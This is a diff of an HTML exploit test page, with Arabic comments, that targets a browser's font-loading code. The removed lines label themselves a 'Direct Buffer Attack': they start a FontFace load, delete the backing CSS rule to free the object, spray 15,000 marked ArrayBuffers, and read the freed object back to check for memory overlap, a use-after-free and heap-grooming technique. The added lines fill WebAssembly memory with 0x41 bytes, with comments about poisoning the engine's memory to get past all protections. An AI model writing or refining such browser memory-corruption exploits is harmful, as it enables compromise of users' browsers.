@@ -12,59 +12,17 @@
     <div id="console"></div>
     <style id="s">@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }</style>
 
-    <script>
-        const log = (msg) => {
-            const consoleDiv = document.getElementById('console');
-            consoleDiv.innerHTML += `<div class="log">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            consoleDiv.scrollTop = consoleDiv.scrollHeight;
-        };
+<script>
+    // استخدام WebAssembly لخلق ذاكرة خام خارج عزل الـ Heap
+    let memory = new WebAssembly.Memory({ initial: 1 });
+    let view = new Uint8Array(memory.buffer);
+    
+    // محاولة تسميم الذاكرة الخاصة بالمحرك مباشرة
+    view.fill(0x41); 
+    
+    // إذا كان بإمكاننا جعل المحرك يقرأ من 'memory' بدلاً من 'FontFace'
+    // سنكون قد تجاوزنا كل الحواجز.
+</script>
 
-        window.onload = async () => {
-            log("INIT: Direct Buffer Attack Active.");
-            
-            // 1. تعريف الكائن المستهدف
-            let A = new FontFace('targetFont', 'url(https://invalid.url)', { unicodeRange: 'U+0041' });
-            document.fonts.add(A);
-            window.spray = [];
-
-            // 2. إطلاق عملية التحميل
-            document.fonts.load('1em targetFont', 'AB');
-
-            setTimeout(() => {
-                log("Executing Rule Deletion...");
-                document.getElementById('s').sheet.deleteRule(0);
-                
-                log("Grooming: Spraying ArrayBuffers (0x100 bytes)...");
-                // الضخ المباشر عبر ArrayBuffer (مستوى منخفض)
-                for (let i = 0; i < 15000; i++) {
-                    let ab = new ArrayBuffer(0x100); 
-                    let view = new DataView(ab);
-                    // وضع البصمة (0x4141...) في بداية الكائن
-                    view.setBigUint64(0, 0x4141414141414141n); 
-                    window.spray.push(ab);
-                }
-
-                // 3. التجميد القسري لضمان استقرار الصفحات
-                log("Freezing Thread...");
-                let start = performance.now();
-                while(performance.now() - start < 400); 
-
-                // 4. قراءة النتائج
-                log("Testing Collision...");
-                try {
-                    let val = A.family;
-                    log("READ_VALUE_RAW: " + val);
-                    
-                    // تحويل القيمة المقروءة إلى Hex للتأكد من التداخل
-                    let buffer = new ArrayBuffer(8);
-                    new BigUint64Array(buffer)[0] = BigInt(typeof val === 'string' ? 0 : val);
-                    log("HEX_DUMP: 0x" + new DataView(buffer).getBigUint64(0).toString(16));
-                    
-                } catch(err) {
-                    log("READ_STATUS: " + err.message);
-                }
-            }, 150);
-        };
-    </script>
 </body>
 </html>
